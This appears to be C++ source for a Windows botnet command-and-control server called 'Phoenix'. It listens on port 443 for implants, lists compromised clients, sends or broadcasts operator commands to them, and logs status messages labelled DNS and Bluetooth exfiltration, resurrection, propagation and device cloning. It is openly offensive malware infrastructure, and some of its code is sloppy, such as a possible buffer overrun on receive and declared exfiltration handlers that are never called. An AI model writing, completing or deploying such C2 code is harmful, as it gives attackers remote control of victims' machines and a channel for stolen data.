#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <conio.h>
#include <iomanip>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

// Configuration
#define C2_PORT 443
#define DNS_PORT 53 
#define BT_PORT 1337
#define MAX_CLIENTS 1024
#define BUFFER_SIZE 8192

// Global variables
std::vector<SOCKET> g_ClientSockets;
std::mutex g_ClientMutex;

// Function prototypes
void HandleDNSExfiltration(SOCKET clientSocket);
void HandleBTExfiltration(SOCKET clientSocket);
void HandleResurrection(SOCKET clientSocket);
void HandlePropagation(SOCKET clientSocket);
void HandleClonedDevice(SOCKET clientSocket);
void DisplayMainMenu();
void DisplayClientList();
void SendCommand(SOCKET clientSocket, const char* command);
void BroadcastCommand(const char* command);

int main() {
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }

    // Create main C2 socket
    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        WSACleanup();
        return 1;
    }

    // Setup address info
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(C2_PORT);

    // Bind socket
    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Bind failed\n");
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    // Listen for connections
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        printf("Listen failed\n");
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    system("cls");
    printf("\n=== Phoenix Command & Control Panel ===\n\n");
    printf("Server listening on port %d...\n\n", C2_PORT);

    // Start connection handler thread
    std::thread connectionThread([listenSocket]() {
        while (true) {
            sockaddr_in clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrLen);
            
            if (clientSocket != INVALID_SOCKET) {
                char clientIP[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
                printf("\n[+] New connection from %s\n", clientIP);
                
                {
                    std::lock_guard<std::mutex> lock(g_ClientMutex);
                    g_ClientSockets.push_back(clientSocket);
                }

                std::thread([=]() {
                    char buffer[BUFFER_SIZE];
                    int bytesReceived;

                    while ((bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0)) > 0) {
                        buffer[bytesReceived] = '\0';
                        printf("\n[>] Received from %s: %s\n", clientIP, buffer);
                        
                        if (strncmp(buffer, "RESURRECT", 9) == 0) {
                            HandleResurrection(clientSocket);
                        }
                        else if (strncmp(buffer, "PROPAGATE", 9) == 0) {
                            HandlePropagation(clientSocket);
                        }
                        else if (strncmp(buffer, "CLONE", 5) == 0) {
                            HandleClonedDevice(clientSocket);
                        }
                    }

                    printf("\n[-] Client %s disconnected\n", clientIP);
                    
                    {
                        std::lock_guard<std::mutex> lock(g_ClientMutex);
                        g_ClientSockets.erase(
                            std::remove(g_ClientSockets.begin(), g_ClientSockets.end(), clientSocket),
                            g_ClientSockets.end()
                        );
                    }
                    
                    closesocket(clientSocket);
                }).detach();
            }
        }
    });
    connectionThread.detach();

    // Main admin console loop
    while (true) {
        DisplayMainMenu();
        int choice = _getch() - '0';
        
        switch(choice) {
            case 1: // List connected clients
                DisplayClientList();
                break;
                
            case 2: // Send command to specific client
                {
                    DisplayClientList();
                    printf("\nEnter client number: ");
                    int clientNum;
                    scanf("%d", &clientNum);
                    
                    if (clientNum >= 0 && clientNum < g_ClientSockets.size()) {
                        printf("Enter command: ");
                        char command[100];
                        scanf(" %[^\n]s", command);
                        SendCommand(g_ClientSockets[clientNum], command);
                    }
                }
                break;
                
            case 3: // Broadcast command
                {
                    printf("\nEnter command to broadcast: ");
                    char command[100];
                    scanf(" %[^\n]s", command);
                    BroadcastCommand(command);
                }
                break;
                
            case 4: // Exit
                printf("\nShutting down server...\n");
                closesocket(listenSocket);
                WSACleanup();
                return 0;
        }
    }
}

void DisplayMainMenu() {
    printf("\n=== Phoenix C2 Menu ===\n");
    printf("1. List connected clients\n");
    printf("2. Send command to client\n");
    printf("3. Broadcast command\n");
    printf("4. Exit\n");
    printf("\nChoice: ");
}

void DisplayClientList() {
    std::lock_guard<std::mutex> lock(g_ClientMutex);
    printf("\n=== Connected Clients ===\n");
    
    if (g_ClientSockets.empty()) {
        printf("No clients connected\n");
        return;
    }
    
    for (size_t i = 0; i < g_ClientSockets.size(); i++) {
        sockaddr_in addr;
        int addrLen = sizeof(addr);
        getpeername(g_ClientSockets[i], (sockaddr*)&addr, &addrLen);
        
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr.sin_addr, clientIP, INET_ADDRSTRLEN);
        
        printf("%zu. %s\n", i, clientIP);
    }
}

void SendCommand(SOCKET clientSocket, const char* command) {
    send(clientSocket, command, strlen(command), 0);
    printf("Command sent\n");
}

void BroadcastCommand(const char* command) {
    std::lock_guard<std::mutex> lock(g_ClientMutex);
    for (SOCKET sock : g_ClientSockets) {
        SendCommand(sock, command);
    }
    printf("Command broadcast to %zu clients\n", g_ClientSockets.size());
}

void HandleDNSExfiltration(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    while ((bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        printf("\n[DNS] Received: %s\n", buffer);
    }
}

void HandleBTExfiltration(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    while ((bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        printf("\n[BT] Received: %s\n", buffer);
    }
}

void HandleResurrection(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    while ((bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        printf("\n[Resurrection] Status: %s\n", buffer);
    }
}

void HandlePropagation(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    while ((bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        printf("\n[Propagation] Status: %s\n", buffer);
    }
}

void HandleClonedDevice(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE];
    int bytesReceived;

    while ((bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        printf("\n[Clone] Status: %s\n", buffer);
    }
}
